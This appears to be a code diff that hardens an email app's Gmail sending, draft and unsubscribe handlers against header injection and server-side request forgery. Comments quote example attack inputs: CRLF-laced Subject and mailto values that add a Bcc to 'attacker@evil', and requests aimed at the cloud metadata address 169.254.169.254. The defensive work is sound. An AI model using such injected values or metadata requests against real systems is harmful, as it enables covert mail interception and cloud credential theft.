@@ -57,6 +57,37 @@ import {
   type TrackingContext,
 } from "../lib/email-tracking.js";
 import { getAppProductionUrl } from "@agent-native/core/server";
+import { isBlockedToolUrl } from "@agent-native/core/tools/url-safety";
+
+/**
+ * Strip CRLF from any value that flows into an RFC 2822 header line. Without
+ * this, any `\r\n` in `to`/`cc`/`bcc`/`subject`/`from` injects a new header
+ * (`Subject: hi\r\nBcc: attacker@evil` would silently BCC the attacker via
+ * the user's connected Gmail account). See email-templates.ts for the same
+ * pattern applied to system emails.
+ */
+function stripCrlf(s: string): string {
+  return s.replace(/[\r\n]+/g, " ").trim();
+}
+
+/**
+ * Loose validator for an RFC 2822 address-list header value (To/Cc/Bcc).
+ * Accepts comma-separated addresses optionally wrapped in `Display Name <addr>`
+ * form. Empty input is allowed (caller guards on required-vs-optional). Real
+ * full-spec validation is intractable in regex; this catches the common
+ * "subject: foo\r\nBcc: …" / "garbage" cases after the CRLF strip and lets
+ * Gmail's server-side validation do the rest.
+ */
+function isValidAddressList(value: string): boolean {
+  if (!value) return true;
+  const stripped = value.trim();
+  if (!stripped) return true;
+  // Address regex: must have something@something.something (no whitespace
+  // inside the local-or-domain). Display-name + angle-addr form is allowed.
+  const ADDR = /(?:[^,<>]*<\s*\S+@\S+\.\S+\s*>|\s*\S+@\S+\.\S+\s*)/;
+  const parts = stripped.split(",");
+  return parts.every((p) => ADDR.test(p.trim()));
+}
 
 // ---------------------------------------------------------------------------
 // Label map cache — avoids re-fetching label names from Gmail on every request
@@ -296,9 +327,13 @@ async function writeLabels(
 async function readSettings(email: string): Promise<UserSettings> {
   const data = await getUserSetting(email, "mail-settings");
   if (data) {
-    return { ...DEFAULT_SETTINGS, ...(data as any) } as UserSettings;
+    return {
+      ...DEFAULT_SETTINGS,
+      ...(data as any),
+      email: (data as any).email || email,
+    } as UserSettings;
   }
-  return { ...DEFAULT_SETTINGS };
+  return { ...DEFAULT_SETTINGS, email };
 }
 
 function recomputeUnreadCounts(
@@ -1223,6 +1258,21 @@ export const sendEmail = defineEventHandler(async (event: H3Event) => {
     return { error: "Missing required fields: to, subject, body" };
   }
 
+  // Validate address-list shape after stripCrlf — guards against header
+  // injection where the attacker supplies a `\r\n`-laced subject or
+  // recipient and tries to smuggle Bcc/Reply-To headers into the raw email.
+  const cleanedTo = stripCrlf(to);
+  const cleanedCc = cc ? stripCrlf(cc) : "";
+  const cleanedBcc = bcc ? stripCrlf(bcc) : "";
+  if (
+    !isValidAddressList(cleanedTo) ||
+    !isValidAddressList(cleanedCc) ||
+    !isValidAddressList(cleanedBcc)
+  ) {
+    setResponseStatus(event, 400);
+    return { error: "Invalid recipient address" };
+  }
+
   // If Gmail is connected, send via Gmail API
   if (await isConnected(email)) {
     try {
@@ -1455,6 +1505,18 @@ export const saveDraft = defineEventHandler(async (event: H3Event) => {
   const { to, cc, bcc, subject, body, draftId, replyToId, replyToThreadId } =
     reqBody;
 
+  // Validate header values after stripCrlf — same protection as sendEmail.
+  // Drafts go through the same buildRawEmail path so they need the same
+  // header-injection guard.
+  if (
+    !isValidAddressList(to ? stripCrlf(to) : "") ||
+    !isValidAddressList(cc ? stripCrlf(cc) : "") ||
+    !isValidAddressList(bcc ? stripCrlf(bcc) : "")
+  ) {
+    setResponseStatus(event, 400);
+    return { error: "Invalid recipient address" };
+  }
+
   // If Gmail is connected, create/update a Gmail draft
   if (await isConnected(email)) {
     const acct = await resolveAccountEmail(reqBody?.accountEmail, email);
@@ -1587,17 +1649,29 @@ function buildRawEmail(opts: {
   references?: string;
   tracking?: TrackingContext;
 }): string {
+  // Strip CRLF from every header value before concatenation. Without this an
+  // attacker who controls `to`/`cc`/`bcc`/`subject` (via API or a malicious
+  // agent action) can inject `\r\nBcc: attacker@evil` and exfiltrate the
+  // outbound mail through the victim's connected Gmail account.
+  const safeFrom = stripCrlf(opts.from);
+  const safeTo = stripCrlf(opts.to);
+  const safeCc = stripCrlf(opts.cc);
+  const safeBcc = stripCrlf(opts.bcc);
+  const safeSubject = stripCrlf(opts.subject);
+  const safeInReplyTo = opts.inReplyTo ? stripCrlf(opts.inReplyTo) : "";
+  const safeReferences = opts.references ? stripCrlf(opts.references) : "";
+
   const boundary = `agent-native-${nanoid(12)}`;
   const textBody = markdownToPlainText(opts.body);
   const htmlBody = bodyToHtml(opts.body, opts.tracking);
   const lines = [
-    `From: ${opts.from}`,
-    `To: ${opts.to}`,
-    ...(opts.cc ? [`Cc: ${opts.cc}`] : []),
-    ...(opts.bcc ? [`Bcc: ${opts.bcc}`] : []),
-    `Subject: ${opts.subject}`,
-    ...(opts.inReplyTo ? [`In-Reply-To: ${opts.inReplyTo}`] : []),
-    ...(opts.references ? [`References: ${opts.references}`] : []),
+    `From: ${safeFrom}`,
+    `To: ${safeTo}`,
+    ...(safeCc ? [`Cc: ${safeCc}`] : []),
+    ...(safeBcc ? [`Bcc: ${safeBcc}`] : []),
+    `Subject: ${safeSubject}`,
+    ...(safeInReplyTo ? [`In-Reply-To: ${safeInReplyTo}`] : []),
+    ...(safeReferences ? [`References: ${safeReferences}`] : []),
     `MIME-Version: 1.0`,
     `Content-Type: multipart/alternative; boundary="${boundary}"`,
     "",
@@ -1687,7 +1761,8 @@ function markdownToHtml(markdown: string): string {
         return `<ol>${items}</ol>`;
       }
 
-      return `<p>${applyInlineMarkdown(escapeHtml(block)).replace(/\n/g, "<br />")}</p>`;
+      const cleanBlock = block.replace(/\\\n/g, "\n").replace(/\\$/gm, "");
+      return `<p>${applyInlineMarkdown(escapeHtml(cleanBlock)).replace(/\n/g, "<br />")}</p>`;
     })
     .join("");
 
@@ -1697,6 +1772,8 @@ function markdownToHtml(markdown: string): string {
 function markdownToPlainText(markdown: string): string {
   return markdown
     .replace(/\r\n/g, "\n")
+    .replace(/\\\n/g, "\n")
+    .replace(/\\$/gm, "")
     .replace(/\[([^\]]+)\]\((https?:\/\/[^\s)]+)\)/g, "$1 ($2)")
     .replace(/`([^`]+)`/g, "$1")
     .replace(/\*\*([^*]+)\*\*/g, "$1")
@@ -2277,8 +2354,23 @@ export const unsubscribeEmail = defineEventHandler(async (event: H3Event) => {
       !!listUnsubPost &&
       listUnsubPost.toLowerCase().includes("list-unsubscribe=one-click");
 
-    // Try RFC 8058 one-click unsubscribe first
+    // Try RFC 8058 one-click unsubscribe first.
+    //
+    // SSRF: the URL comes from an inbound email's `List-Unsubscribe` header
+    // — fully attacker-controlled. Without this guard a phishing email can
+    // make the production server POST to AWS IMDS (`http://169.254.169.254/`),
+    // localhost loopback, or internal cluster services and exfiltrate cloud
+    // creds / hit authenticated internal endpoints.
     if (oneClick && url) {
+      if (isBlockedToolUrl(url)) {
+        console.warn(
+          "[unsubscribe] one-click POST blocked: SSRF-protected URL",
+        );
+        // Don't echo the URL — that would let an attacker probe via the
+        // error response to map internal infrastructure.
+        setResponseStatus(event, 400);
+        return { error: "Unsubscribe URL is not allowed" };
+      }
       try {
         const res = await fetch(url, {
           method: "POST",
@@ -2301,9 +2393,17 @@ export const unsubscribeEmail = defineEventHandler(async (event: H3Event) => {
         const subject = params.get("subject") || "Unsubscribe";
         const bodyText = params.get("body") || "";
 
+        // CRLF-strip every header value flowing into the raw RFC 2822
+        // message — the address/subject/body all come from inbound email
+        // headers and are attacker-controlled. Without this an unsubscribe
+        // mailto URI of `mailto:victim@target?subject=Hi%0D%0ABcc:attacker`
+        // injects a Bcc through the user's connected Gmail account.
+        const safeAddress = stripCrlf(address || "");
+        const safeSubject = stripCrlf(subject);
+
         // Build RFC 2822 email
         const raw = Buffer.from(
-          `To: ${address}\r\nSubject: ${subject}\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n${bodyText}`,
+          `To: ${safeAddress}\r\nSubject: ${safeSubject}\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n${bodyText}`,
         )
           .toString("base64")
           .replace(/\+/g, "-")
@@ -2311,7 +2411,7 @@ export const unsubscribeEmail = defineEventHandler(async (event: H3Event) => {
           .replace(/=+$/, "");
 
         await gmailSendMessage(accessToken, raw);
-        return { ok: true, method: "mailto", address, url };
+        return { ok: true, method: "mailto", address: safeAddress, url };
       } catch (e: any) {
         console.warn("[unsubscribe] mailto send failed:", e.message);
       }
